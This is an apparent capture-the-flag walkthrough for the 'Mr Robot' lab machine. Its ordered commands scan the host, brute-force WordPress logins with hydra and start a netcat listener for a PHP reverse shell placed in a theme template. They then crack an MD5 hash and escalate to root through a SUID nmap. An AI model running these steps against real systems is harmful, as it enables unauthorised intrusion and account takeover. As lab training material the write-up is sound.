
MR ROBOT CTF

--------------------
#Initial nmap scan of the given IP address

nmap -sV -sC -oA nmapscan/initial MACHINE_IP

--------------------

#Carry out enumeration on thr given web to find content that has not been indexed i.e say the robots.txt file

On the browser: http://MACHINE_IP/robots.txt

------------------------------

#Directory busting to find hidden directories in the web application

gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

-----------------------------------

#The gobuster gives a lucrative output of a wordpress site and wordpress usually is vulnerable to many attacks
#We attempt bruteforce login using hydra
#This tries to bruteforce the valid username used to login 

hydra -L fsocity.dic -p test MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

-------------------------------
#Bruteforcing the password after getting a valid username
----------------------------------------

hydra -l Elliot -P fsocity.dic MACHINE_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30

#After gaining access we need a php reverse shell to get into the machine hosting the website
---------------------------------------

rlwrap nc -lvnp 53
 where l= listening
	v= verbose
	n= reverse_name lookup
	p= port being scanned
#getting the reverse shell script

Search on the web for the script 

php reverse shell script in raw format, copy the code in the archives or the 404 template in the editor area of the wordpress site and save

Run the script to obtain a reverse shell on your terminal


#Use john to get the backup password
---------------------------------

john md5.hash --wordlist=fsocity.dic --format=Raw-MD5



#Having a fully interactive shell on our target
----------------------------------

python -c 'import pty;pty.spawn("/bin/bash")'

---------------------------

At this point one is able to read the protected txt file

#Heading to root privilege escalation on the target machine.Here we take advantage of the SUID BINARIES
-----------------------------

find / -perm +6000 2>/dev/null | grep '/bin'

#Finding the nmap binary SUID

#GO to GTFOBins to find exploits to SUID binary exploits
-----------------------------
nmap --interactive

!sh
